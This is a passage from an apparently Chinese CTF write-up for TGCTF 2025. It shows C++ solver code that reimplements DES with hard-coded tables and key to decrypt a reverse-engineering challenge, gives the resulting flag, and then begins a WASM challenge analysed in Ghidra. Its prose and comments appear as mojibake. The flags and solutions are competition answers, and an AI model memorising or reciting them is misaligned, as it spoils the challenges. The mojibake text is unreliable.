class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00802000</span>,</span><br><span class="line">    <span class="number">0x00002080</span>, <span class="number">0x00800080</span>, <span class="number">0x00800081</span>, <span class="number">0x00000001</span>, <span class="number">0x00802001</span>, <span class="number">0x00002081</span>, <span class="number">0x00002081</span>, <span class="number">0x00000080</span>,</span><br><span class="line">    <span class="number">0x00802081</span>, <span class="number">0x00000081</span>, <span class="number">0x00000001</span>, <span class="number">0x00002000</span>, <span class="number">0x00800001</span>, <span class="number">0x00002001</span>, <span class="number">0x00802080</span>, <span class="number">0x00800081</span>,</span><br><span class="line">    <span class="number">0x00002001</span>, <span class="number">0x00002080</span>, <span class="number">0x00800000</span>, <span class="number">0x00802001</span>, <span class="number">0x00000080</span>, <span class="number">0x00800000</span>, <span class="number">0x00002000</span>, <span class="number">0x00802080</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s5[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00000100</span>, <span class="number">0x02080100</span>, <span class="number">0x02080000</span>, <span class="number">0x42000100</span>, <span class="number">0x00080000</span>, <span class="number">0x00000100</span>, <span class="number">0x40000000</span>, <span class="number">0x02080000</span>,</span><br><span class="line">    <span class="number">0x40080100</span>, <span class="number">0x00080000</span>, <span class="number">0x02000100</span>, <span class="number">0x40080100</span>, <span class="number">0x42000100</span>, <span class="number">0x42080000</span>, <span class="number">0x00080100</span>, <span class="number">0x40000000</span>,</span><br><span class="line">    <span class="number">0x02000000</span>, <span class="number">0x40080000</span>, <span class="number">0x40080000</span>, <span class="number">0x00000000</span>, <span class="number">0x40000100</span>, <span class="number">0x42080100</span>, <span class="number">0x42080100</span>, <span class="number">0x02000100</span>,</span><br><span class="line">    <span class="number">0x42080000</span>, <span class="number">0x40000100</span>, <span class="number">0x00000000</span>, <span class="number">0x42000000</span>, <span class="number">0x02080100</span>, <span class="number">0x02000000</span>, <span class="number">0x42000000</span>, <span class="number">0x00080100</span>,</span><br><span class="line">    <span class="number">0x00080000</span>, <span class="number">0x42000100</span>, <span class="number">0x00000100</span>, <span class="number">0x02000000</span>, <span class="number">0x40000000</span>, <span class="number">0x02080000</span>, <span class="number">0x42000100</span>, <span class="number">0x40080100</span>,</span><br><span class="line">    <span class="number">0x02000100</span>, <span class="number">0x40000000</span>, <span class="number">0x42080000</span>, <span class="number">0x02080100</span>, <span class="number">0x40080100</span>, <span class="number">0x00000100</span>, <span class="number">0x02000000</span>, <span class="number">0x42080000</span>,</span><br><span class="line">    <span class="number">0x42080100</span>, <span class="number">0x00080100</span>, <span class="number">0x42000000</span>, <span class="number">0x42080100</span>, <span class="number">0x02080000</span>, <span class="number">0x00000000</span>, <span class="number">0x40080000</span>, <span class="number">0x42000000</span>,</span><br><span class="line">    <span class="number">0x00080100</span>, <span class="number">0x02000100</span>, <span class="number">0x40000100</span>, <span class="number">0x00080000</span>, <span class="number">0x00000000</span>, <span class="number">0x40080000</span>, <span class="number">0x02080100</span>, <span class="number">0x40000100</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s6[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x20000010</span>, <span class="number">0x20400000</span>, <span class="number">0x00004000</span>, <span class="number">0x20404010</span>, <span class="number">0x20400000</span>, <span class="number">0x00000010</span>, <span class="number">0x20404010</span>, <span class="number">0x00400000</span>,</span><br><span class="line">    <span class="number">0x20004000</span>, <span class="number">0x00404010</span>, <span class="number">0x00400000</span>, <span class="number">0x20000010</span>, <span class="number">0x00400010</span>, <span class="number">0x20004000</span>, <span class="number">0x20000000</span>, <span class="number">0x00004010</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00400010</span>, <span class="number">0x20004010</span>, <span class="number">0x00004000</span>, <span class="number">0x00404000</span>, <span class="number">0x20004010</span>, <span class="number">0x00000010</span>, <span class="number">0x20400010</span>,</span><br><span class="line">    <span class="number">0x20400010</span>, <span class="number">0x00000000</span>, <span class="number">0x00404010</span>, <span class="number">0x20404000</span>, <span class="number">0x00004010</span>, <span class="number">0x00404000</span>, <span class="number">0x20404000</span>, <span class="number">0x20000000</span>,</span><br><span class="line">    <span class="number">0x20004000</span>, <span class="number">0x00000010</span>, <span class="number">0x20400010</span>, <span class="number">0x00404000</span>, <span class="number">0x20404010</span>, <span class="number">0x00400000</span>, <span class="number">0x00004010</span>, <span class="number">0x20000010</span>,</span><br><span class="line">    <span class="number">0x00400000</span>, <span class="number">0x20004000</span>, <span class="number">0x20000000</span>, <span class="number">0x00004010</span>, <span class="number">0x20000010</span>, <span class="number">0x20404010</span>, <span class="number">0x00404000</span>, <span class="number">0x20400000</span>,</span><br><span class="line">    <span class="number">0x00404010</span>, <span class="number">0x20404000</span>, <span class="number">0x00000000</span>, <span class="number">0x20400010</span>, <span class="number">0x00000010</span>, <span class="number">0x00004000</span>, <span class="number">0x20400000</span>, <span class="number">0x00404010</span>,</span><br><span class="line">    <span class="number">0x00004000</span>, <span class="number">0x00400010</span>, <span class="number">0x20004010</span>, <span class="number">0x00000000</span>, <span class="number">0x20404000</span>, <span class="number">0x20000000</span>, <span class="number">0x00400010</span>, <span class="number">0x20004010</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s7[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00200000</span>, <span class="number">0x04200002</span>, <span class="number">0x04000802</span>, <span class="number">0x00000000</span>, <span class="number">0x00000800</span>, <span class="number">0x04000802</span>, <span class="number">0x00200802</span>, <span class="number">0x04200800</span>,</span><br><span class="line">    <span class="number">0x04200802</span>, <span class="number">0x00200000</span>, <span class="number">0x00000000</span>, <span class="number">0x04000002</span>, <span class="number">0x00000002</span>, <span class="number">0x04000000</span>, <span class="number">0x04200002</span>, <span class="number">0x00000802</span>,</span><br><span class="line">    <span class="number">0x04000800</span>, <span class="number">0x00200802</span>, <span class="number">0x00200002</span>, <span class="number">0x04000800</span>, <span class="number">0x04000002</span>, <span class="number">0x04200000</span>, <span class="number">0x04200800</span>, <span class="number">0x00200002</span>,</span><br><span class="line">    <span class="number">0x04200000</span>, <span class="number">0x00000800</span>, <span class="number">0x00000802</span>, <span class="number">0x04200802</span>, <span class="number">0x00200800</span>, <span class="number">0x00000002</span>, <span class="number">0x04000000</span>, <span class="number">0x00200800</span>,</span><br><span class="line">    <span class="number">0x04000000</span>, <span class="number">0x00200800</span>, <span class="number">0x00200000</span>, <span class="number">0x04000802</span>, <span class="number">0x04000802</span>, <span class="number">0x04200002</span>, <span class="number">0x04200002</span>, <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00200002</span>, <span class="number">0x04000000</span>, <span class="number">0x04000800</span>, <span class="number">0x00200000</span>, <span class="number">0x04200800</span>, <span class="number">0x00000802</span>, <span class="number">0x00200802</span>, <span class="number">0x04200800</span>,</span><br><span class="line">    <span class="number">0x00000802</span>, <span class="number">0x04000002</span>, <span class="number">0x04200802</span>, <span class="number">0x04200000</span>, <span class="number">0x00200800</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x04200802</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00200802</span>, <span class="number">0x04200000</span>, <span class="number">0x00000800</span>, <span class="number">0x04000002</span>, <span class="number">0x04000800</span>, <span class="number">0x00000800</span>, <span class="number">0x00200002</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s8[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x10001040</span>, <span class="number">0x00001000</span>, <span class="number">0x00040000</span>, <span class="number">0x10041040</span>, <span class="number">0x10000000</span>, <span class="number">0x10001040</span>, <span class="number">0x00000040</span>, <span class="number">0x10000000</span>,</span><br><span class="line">    <span class="number">0x00040040</span>, <span class="number">0x10040000</span>, <span class="number">0x10041040</span>, <span class="number">0x00041000</span>, <span class="number">0x10041000</span>, <span class="number">0x00041040</span>, <span class="number">0x00001000</span>, <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x10040000</span>, <span class="number">0x10000040</span>, <span class="number">0x10001000</span>, <span class="number">0x00001040</span>, <span class="number">0x00041000</span>, <span class="number">0x00040040</span>, <span class="number">0x10040040</span>, <span class="number">0x10041000</span>,</span><br><span class="line">    <span class="number">0x00001040</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x10040040</span>, <span class="number">0x10000040</span>, <span class="number">0x10001000</span>, <span class="number">0x00041040</span>, <span class="number">0x00040000</span>,</span><br><span class="line">    <span class="number">0x00041040</span>, <span class="number">0x00040000</span>, <span class="number">0x10041000</span>, <span class="number">0x00001000</span>, <span class="number">0x00000040</span>, <span class="number">0x10040040</span>, <span class="number">0x00001000</span>, <span class="number">0x00041040</span>,</span><br><span class="line">    <span class="number">0x10001000</span>, <span class="number">0x00000040</span>, <span class="number">0x10000040</span>, <span class="number">0x10040000</span>, <span class="number">0x10040040</span>, <span class="number">0x10000000</span>, <span class="number">0x00040000</span>, <span class="number">0x10001040</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x10041040</span>, <span class="number">0x00040040</span>, <span class="number">0x10000040</span>, <span class="number">0x10040000</span>, <span class="number">0x10001000</span>, <span class="number">0x10001040</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x10041040</span>, <span class="number">0x00041000</span>, <span class="number">0x00041000</span>, <span class="number">0x00001040</span>, <span class="number">0x00001040</span>, <span class="number">0x00040040</span>, <span class="number">0x10000000</span>, <span class="number">0x10041000</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> word_7FF65FC70900[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0x0080</span>, <span class="number">0x0040</span>, <span class="number">0x0020</span>, <span class="number">0x0010</span>, <span class="number">0x0008</span>, <span class="number">0x0004</span>, <span class="number">0x0002</span>, <span class="number">0x0001</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_7FF65FC70910[<span class="number">24</span>] = &#123;</span><br><span class="line">    <span class="number">0x00800000</span>, <span class="number">0x00400000</span>, <span class="number">0x00200000</span>, <span class="number">0x00100000</span>, <span class="number">0x00080000</span>, <span class="number">0x00040000</span>, <span class="number">0x00020000</span>, <span class="number">0x00010000</span>,</span><br><span class="line">    <span class="number">0x00008000</span>, <span class="number">0x00004000</span>, <span class="number">0x00002000</span>, <span class="number">0x00001000</span>, <span class="number">0x00000800</span>, <span class="number">0x00000400</span>, <span class="number">0x00000200</span>, <span class="number">0x00000100</span>,</span><br><span class="line">    <span class="number">0x00000080</span>, <span class="number">0x00000040</span>, <span class="number">0x00000020</span>, <span class="number">0x00000010</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF65FC70970[<span class="number">56</span>] = &#123;</span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x30</span>, <span class="number">0x28</span>, <span class="number">0x20</span>, <span class="number">0x18</span>, <span class="number">0x10</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x31</span>, <span class="number">0x29</span>, <span class="number">0x21</span>, <span class="number">0x19</span>, <span class="number">0x11</span>, <span class="number">0x09</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x3A</span>, <span class="number">0x32</span>, <span class="number">0x2A</span>, <span class="number">0x22</span>, <span class="number">0x1A</span>, <span class="number">0x12</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0x3B</span>, <span class="number">0x33</span>, <span class="number">0x2B</span>, <span class="number">0x23</span>, <span class="number">0x3E</span>, <span class="number">0x36</span>, <span class="number">0x2E</span>, <span class="number">0x26</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x16</span>, <span class="number">0x0E</span>, <span class="number">0x06</span>, <span class="number">0x3D</span>, <span class="number">0x35</span>, <span class="number">0x2D</span>, <span class="number">0x25</span>, <span class="number">0x1D</span>, <span class="number">0x15</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x2C</span>, <span class="number">0x24</span>,</span><br><span class="line">    <span class="number">0x1C</span>, <span class="number">0x14</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1B</span>, <span class="number">0x13</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF65FC709A8[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">des_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *_a1_, DWORD *_a2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> left = _a1_[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> right = _a1_[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> temp = (left ^ (right &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xF0F0F0F</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">4</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (left ^ (right &gt;&gt; <span class="number">16</span>)) &amp; <span class="number">0x0000FFFF</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">16</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0x33333333</span>;</span><br><span class="line">    right = temp ^ right;</span><br><span class="line">    left = (temp &lt;&lt; <span class="number">2</span>) ^ left;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">8</span>)) &amp; <span class="number">0x00FF00FF</span>;</span><br><span class="line">    right = temp ^ right;</span><br><span class="line">    left = (((temp &lt;&lt; <span class="number">8</span>) ^ left) &gt;&gt; <span class="number">31</span>) | (<span class="number">2</span> * ((temp &lt;&lt; <span class="number">8</span>) ^ left));</span><br><span class="line"></span><br><span class="line">    temp = (left ^ right) &amp; <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = ((temp ^ right) &gt;&gt; <span class="number">31</span>) | (<span class="number">2</span> * (temp ^ right));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = *_a2_++ ^ ((left &gt;&gt; <span class="number">4</span>) | (left &lt;&lt; <span class="number">28</span>));</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> result1 = s1[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                               s3[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                               s5[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                               s7[temp &amp; <span class="number">0x3F</span>];</span><br><span class="line">        temp = *_a2_++ ^ left;</span><br><span class="line"></span><br><span class="line">        right ^= s2[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 s4[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 s6[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 s8[temp &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 result1;</span><br><span class="line"></span><br><span class="line">        temp = *_a2_++ ^ ((right &gt;&gt; <span class="number">4</span>) | (right &lt;&lt; <span class="number">28</span>));</span><br><span class="line">        result1 = s1[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                  s3[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                  s5[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                  s7[temp &amp; <span class="number">0x3F</span>];</span><br><span class="line"></span><br><span class="line">        temp = *_a2_++ ^ right;</span><br><span class="line">        left ^= s2[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                s4[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                s6[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                s8[temp &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                result1;</span><br><span class="line">    &#125;</span><br><span class="line">    left = (left &gt;&gt; <span class="number">1</span>) | (left &lt;&lt; <span class="number">31</span>);</span><br><span class="line">    temp = (left ^ right) &amp; <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = ((temp ^ right) &gt;&gt; <span class="number">1</span>) | ((temp ^ right) &lt;&lt; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">    temp = (left ^ (right &gt;&gt; <span class="number">8</span>)) &amp; <span class="number">0xFF00FF</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">8</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (left ^ (right &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0x33333333</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">2</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">16</span>)) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">    right = temp ^ right;</span><br><span class="line">    left = (temp &lt;&lt; <span class="number">16</span>) ^ left;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0x0F0F0F0F</span>;</span><br><span class="line"></span><br><span class="line">    _a1_[<span class="number">0</span>] = (temp &lt;&lt; <span class="number">4</span>) ^ left;</span><br><span class="line">    _a1_[<span class="number">1</span>] = temp ^ right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">64</span>] = &#123;</span><br><span class="line">        <span class="number">0x2C0B3C36</span>, <span class="number">0x09221A0A</span>, <span class="number">0x2829051D</span>, <span class="number">0x09123B0D</span>, <span class="number">0x2C091B18</span>, <span class="number">0x0512011F</span>, <span class="number">0x09292E17</span>, <span class="number">0x07122920</span>,</span><br><span class="line">        <span class="number">0x090D1703</span>, <span class="number">0x0514372E</span>, <span class="number">0x0915123C</span>, <span class="number">0x27100E27</span>, <span class="number">0x01050927</span>, <span class="number">0x25150D29</span>, <span class="number">0x13151F32</span>, <span class="number">0x24112618</span>,</span><br><span class="line">        <span class="number">0x03052031</span>, <span class="number">0x34312B37</span>, <span class="number">0x13043A05</span>, <span class="number">0x3C19151B</span>, <span class="number">0x23063B3E</span>, <span class="number">0x34293830</span>, <span class="number">0x03062108</span>, <span class="number">0x380B3F2A</span>,</span><br><span class="line">        <span class="number">0x260E063D</span>, <span class="number">0x3009141B</span>, <span class="number">0x0E223D3D</span>, <span class="number">0x300B0124</span>, <span class="number">0x062A1700</span>, <span class="number">0x11093D14</span>, <span class="number">0x0E22262B</span>, <span class="number">0x1208083E</span>,</span><br><span class="line">        <span class="number">0x0E22262B</span>, <span class="number">0x1208083E</span>, <span class="number">0x062A1700</span>, <span class="number">0x11093D14</span>, <span class="number">0x0E223D3D</span>, <span class="number">0x300B0124</span>, <span class="number">0x260E063D</span>, <span class="number">0x3009141B</span>,</span><br><span class="line">        <span class="number">0x03062108</span>, <span class="number">0x380B3F2A</span>, <span class="number">0x23063B3E</span>, <span class="number">0x34293830</span>, <span class="number">0x13043A05</span>, <span class="number">0x3C19151B</span>, <span class="number">0x03052031</span>, <span class="number">0x34312B37</span>,</span><br><span class="line">        <span class="number">0x13151F32</span>, <span class="number">0x24112618</span>, <span class="number">0x01050927</span>, <span class="number">0x25150D29</span>, <span class="number">0x0915123C</span>, <span class="number">0x27100E27</span>, <span class="number">0x090D1703</span>, <span class="number">0x0514372E</span>,</span><br><span class="line">        <span class="number">0x09292E17</span>, <span class="number">0x07122920</span>, <span class="number">0x2C091B18</span>, <span class="number">0x0512011F</span>, <span class="number">0x2829051D</span>, <span class="number">0x09123B0D</span>, <span class="number">0x2C0B3C36</span>, <span class="number">0x09221A0A</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> data[<span class="number">64</span>] = &#123;</span><br><span class="line">        <span class="number">0x00000084</span>, <span class="number">0x0000008B</span>, <span class="number">0x00000003</span>, <span class="number">0x00000022</span>, <span class="number">0x00000014</span>, <span class="number">0x000000BE</span>, <span class="number">0x000000DF</span>, <span class="number">0x00000075</span>,</span><br><span class="line">        <span class="number">0x000000B3</span>, <span class="number">0x000000D5</span>, <span class="number">0x00000076</span>, <span class="number">0x0000006F</span>, <span class="number">0x000000CD</span>, <span class="number">0x0000002A</span>, <span class="number">0x0000005D</span>, <span class="number">0x000000D7</span>,</span><br><span class="line">        <span class="number">0x0000004D</span>, <span class="number">0x000000B2</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000098</span>, <span class="number">0x0000009D</span>, <span class="number">0x0000003E</span>, <span class="number">0x000000A8</span>,</span><br><span class="line">        <span class="number">0x000000F7</span>, <span class="number">0x00000023</span>, <span class="number">0x000000F2</span>, <span class="number">0x0000008B</span>, <span class="number">0x000000F2</span>, <span class="number">0x00000054</span>, <span class="number">0x00000065</span>, <span class="number">0x0000007A</span>,</span><br><span class="line">        <span class="number">0x00000020</span>, <span class="number">0x000000C0</span>, <span class="number">0x00000087</span>, <span class="number">0x00000055</span>, <span class="number">0x000000D6</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000046</span>, <span class="number">0x0000003D</span>,</span><br><span class="line">        <span class="number">0x000000F7</span>, <span class="number">0x000000B2</span>, <span class="number">0x0000007A</span>, <span class="number">0x0000009D</span>, <span class="number">0x000000C2</span>, <span class="number">0x000000CF</span>, <span class="number">0x0000001A</span>, <span class="number">0x000000AE</span>,</span><br><span class="line">        <span class="number">0x00000016</span>, <span class="number">0x000000C7</span>, <span class="number">0x00000015</span>, <span class="number">0x00000030</span>, <span class="number">0x0000008E</span>, <span class="number">0x000000FD</span>, <span class="number">0x0000008F</span>, <span class="number">0x0000009E</span>,</span><br><span class="line">        <span class="number">0x000000AA</span>, <span class="number">0x00000039</span>, <span class="number">0x000000AB</span>, <span class="number">0x000000FE</span>, <span class="number">0x00000095</span>, <span class="number">0x000000A7</span>, <span class="number">0x0000001F</span>, <span class="number">0x000000F1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Enc[<span class="number">64</span>]&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">        Enc[i] = data[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å››å­—èŠ‚ä¸€ç»„ç¿»è½¬</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> a = Enc[i], b = Enc[i + <span class="number">1</span>], c = Enc[i + <span class="number">2</span>], d = Enc[i + <span class="number">3</span>];</span><br><span class="line">        Enc[i] = d;</span><br><span class="line">        Enc[i + <span class="number">1</span>] = c;</span><br><span class="line">        Enc[i + <span class="number">2</span>] = b;</span><br><span class="line">        Enc[i + <span class="number">3</span>] = a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// DESè§£å¯†ï¼ˆç”¨å32ä¸ªkeyï¼‰</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">des_encrypt</span>((<span class="type">unsigned</span> <span class="type">int</span> *)(Enc + i), (DWORD *)(key + <span class="number">32</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å››å­—èŠ‚ä¸€ç»„ç¿»è½¬</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> a = Enc[i], b = Enc[i + <span class="number">1</span>], c = Enc[i + <span class="number">2</span>], d = Enc[i + <span class="number">3</span>];</span><br><span class="line">        Enc[i] = d;</span><br><span class="line">        Enc[i + <span class="number">1</span>] = c;</span><br><span class="line">        Enc[i + <span class="number">2</span>] = b;</span><br><span class="line">        Enc[i + <span class="number">3</span>] = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HZNUCTF&#123;&quot;</span>);</span><br><span class="line">    <span class="comment">// é€†å‘åˆå§‹å­—ç¬¦ä¸²å˜æ¢</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        std::string tmp1;</span><br><span class="line">        tmp1 += Enc[i];</span><br><span class="line">        tmp1 += Enc[i + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        std::string tmp2;</span><br><span class="line">        tmp2 += Enc[i + <span class="number">1</span>];</span><br><span class="line">        tmp2 += Enc[i + <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">char</span>(std::<span class="built_in">stoi</span>(tmp1, <span class="number">0</span>, <span class="number">16</span>)));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">char</span>(std::<span class="built_in">stoi</span>(tmp2, <span class="number">0</span>, <span class="number">16</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{391ds2b9-9e31-45f8-ba4a-4904a2d8}</p><h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><p>ä¸‹è½½é™„ä»¶å‘ç° wasm æ–‡ä»¶å¼€å¤´å­—èŠ‚å’Œæ­£å¸¸ wasm æ–‡ä»¶ä¸ä¸€æ ·ï¼Œå¤åˆ¶ä¿®å¤å³å¯ã€‚</p><p>å·¦é¢˜ç›®é™„ä»¶ï¼Œå³æ­£å¸¸ wasm æ–‡ä»¶ã€‚</p><p><img src="/2025/04/13/TGCTF2025/M9ZPbLMbioV3hrxarPMciS0dnbf.png"></p><p>ä½¿ç”¨ ghidra è¿›è¡Œåˆ†æï¼Œå› ä¸ºæœ‰ä¸“é—¨çš„ wasm åç¼–è¯‘æ’ä»¶ã€‚</p><p>é€šè¿‡ Exports å®šä½åˆ° main å‡½æ•°ï¼Œä»¥ä¸‹æ˜¯ç»è¿‡æˆ‘é‡å‘½ååçš„ç»“æœã€‚</p><p><img src="/2025/04/13/TGCTF2025/Mo4zbUXD1okZhqxZWYDcEm0vnId.png"></p><p>é¦–å…ˆæ˜¯è¾“å…¥ keyï¼Œç„¶ååˆ¤æ–­å’Œè¯¥å¤„æ˜æ–‡æ˜¯å¦ç›¸ç­‰ã€‚</p><p>ç„¶åå°† Key xor ä¸Š 0x51ã€‚</p><p><img src="/2025/04/13/TGCTF2025/F4AZbPGRWodE4xxUffqcALrfnoe.png"></p><p><img src="/2025/04/13/TGCTF2025/Ua4PbQxeMo07WDxysZ8czeFMnff.png"></p><p>ç¬¬ä¸€æ­¥åŠ å¯†ï¼Œç½®äº†éšæœºæ•°ç§å­ 0x194ï¼Œç„¶åç”¨éšæœºæ•°æ‰“ä¹±è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå†è½¬å­˜åˆ°å¦ä¸€ä¸ª Out æ•°ç»„ã€‚</p><p><img src="/2025/04/13/TGCTF2025/Ug0bbgaRVozqItxGyL8c8INnnhh.png"></p><p><img src="/2025/04/13/TGCTF2025/NXLdb6PLdouDr5xaFMDcw4OHnYv.png"></p><p>ç¬¬äºŒæ­¥åŠ 